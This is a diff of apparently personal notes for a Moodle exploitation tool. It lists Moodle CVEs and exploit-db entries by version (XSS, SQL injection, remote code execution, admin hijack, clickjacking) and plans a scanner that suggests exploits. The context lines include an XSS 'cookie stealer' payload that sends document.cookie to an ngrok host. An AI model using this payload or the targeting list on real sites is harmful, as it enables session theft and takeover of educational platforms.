@@ -15,9 +15,13 @@ https://docs.moodle.org/dev/Security:Cross-site_scripting
 My cookie stealer:
 <script>alert('xss');document.write('<img src="https://668da81e.ngrok.io/?cookie=' + document.cookie + '" />')</script>
 
+https://blog.innerht.ml/tag/clickjacking/ good demo of a button that follows the mouse.
+
 https://moodle.org/mod/forum/discuss.php?d=384010 3.6 login as, hijack admin account
 
 https://www.cvedetails.com/cve/CVE-2018-1045/ 3.3.4 XSS in calendar event name
+
+https://moodle.org/mod/forum/discuss.php?d=345915 3.2.1 xss via url
 
 https://moodle.org/mod/forum/discuss.php?d=381230 3.6 could use a clickhijack to self
 
@@ -27,21 +31,13 @@ https://www.cvedetails.com/cve/CVE-2017-2641/ used by exploit below
 
 https://www.exploit-db.com/exploits/41828 3.2.1 SQL injection
 
-https://www.exploit-db.com/exploits/46551 3.4.1 RCE
+https://www.exploit-db.com/exploits/46551 3.4.1 RCE, CVE below
 
 https://www.cvedetails.com/cve/CVE-2018-1133/ 3.4.2 remote code exec for teacher "Calculated question"
 
+fresher:
+
 https://www.cvedetails.com/cve/CVE-2018-14630/ 3.5.2 remote code exec for (teacher?) "quiz import"
-
-https://www.cvedetails.com/cve/CVE-2013-4313/ useless
-
-https://www.cvedetails.com/cve/CVE-2016-9187/ useless
-
-https://www.cvedetails.com/cve/CVE-2016-9186/ related, useless
-
-https://www.cvedetails.com/cve/CVE-2011-4295/ useless
-
-https://www.cvedetails.com/cve/CVE-2016-2152/ useless
 
 Features:
 1. scan: detect version (working!), suggest supported exploits
